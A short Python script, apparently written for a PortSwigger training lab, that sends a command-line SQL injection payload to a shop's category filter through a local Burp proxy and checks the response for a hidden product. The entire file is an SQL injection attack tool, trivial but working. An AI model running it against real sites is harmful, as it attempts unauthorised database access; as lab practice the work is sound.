import requests  # http requests
import sys
import urllib3

# From PortSwigger's Lab

# Set the proxy setting in the script
# the script will pass throuh the proxy (burp) if allowed it in the burp proxy to
# relay it back to the webserver then it will do that and then the response from the web server
# will get thorgh my proxie again and then back to the appiclation

proxies = {"http": 'http://127.0.0.1:8080', "https": "https://127.0.0.1:8080"}


def exploit_sqli(url, payload):
    uri = '/filter?category=Accessories'
    # concatena tudo 
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)

    # figure out if succefully exploit the vulnerabily

    if "Cat grin" in r.text:
        return True
    else:
        return False


# When I run the script I give it 2 command line parameters
# the first one is the url of the application 
# the second is the payload that I want to use 
# if it doesn't find the correct parameters or so on it will thrown an exception 

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # url of the app
        payload = sys.argv[2].strip()  # payload
    except IndexError:
        print("[ - ] Usage: %s <url> <payload>" % sys.argv[0])
        print('[ - ] Example: %s www.example.com "1=1" ' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")

    else:
        print("[-] SQL injection unsuccessful!")
